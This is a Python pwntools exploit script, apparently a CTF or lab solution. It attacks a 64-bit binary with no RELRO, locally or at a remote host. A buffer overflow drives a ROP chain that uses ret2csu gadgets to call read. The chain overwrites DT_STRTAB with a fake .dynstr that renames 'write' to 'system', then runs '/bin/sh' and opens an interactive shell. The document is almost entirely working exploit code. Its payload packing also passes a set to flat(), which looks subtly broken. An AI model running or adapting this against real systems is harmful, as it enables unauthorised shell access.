from pwn import *
context(os="linux", arch="amd64")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = args.FNAME if (args.FNAME) else "./main_no_relro_64"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def ropArgs3(rdi, rsi, rdx, got_func):
	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
	addr_pop6_ret = 0x40076a
	# mov rdx, r15; mov rsi, r14; mov edi, r13d; 
	# call QWORD PTR [r12+rbx*8];
	# add rbx, 0x1; cmp rbp, rbx; jne 0x400750;
	# add rsp, 0x8;
	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
	addr_mov_call = 0x400750
	return flat([
		addr_pop6_ret,
		0, # rbx
		1, # rbp
		got_func, # r12
		rdi, # r13->edi
		rsi, # r14->rsi
		rdx, # r15->rdx
		addr_mov_call, # ret
		p64(0) * 7,
	])


def pwn():
	bss_addr = g_elf.bss()
	new_stk = bss_addr + 0xd0 # new_stk = 0x600c00
	bof_padding_len = 0x70 + 8
	p_rdi = 0x400773 # pop rdi; ret
	write_plt = 0x4004e6
	addr_dt_strtab = g_elf.get_section_by_name(".dynamic")["sh_addr"] + 0x10*8 + 8
	binsh_addr = new_stk
	sh = "/bin/sh\0"
	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
	fake_dynstr_addr = binsh_addr + 8


	rop = ROP(g_elf)
	rop.raw('a' * bof_padding_len)
	rop.raw(ropArgs3(0, addr_dt_strtab, 0x8, g_elf.got["read"]))
	rop.raw(ropArgs3(0, new_stk, len(sh) + len(fake_dynstr), g_elf.got["read"]))
	rop.raw(p_rdi) # pop rdi; ret
	rop.raw(binsh_addr)
	rop.raw(write_plt)

	print("rop chain length: %d\n", len(rop.chain()))
	assert(len(rop.chain()) <= 0x100)

	payload = flat({rop.chain().ljust(0x100, b"\x00"), binsh_addr, fake_dynstr})

	g_io.send(payload)
	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
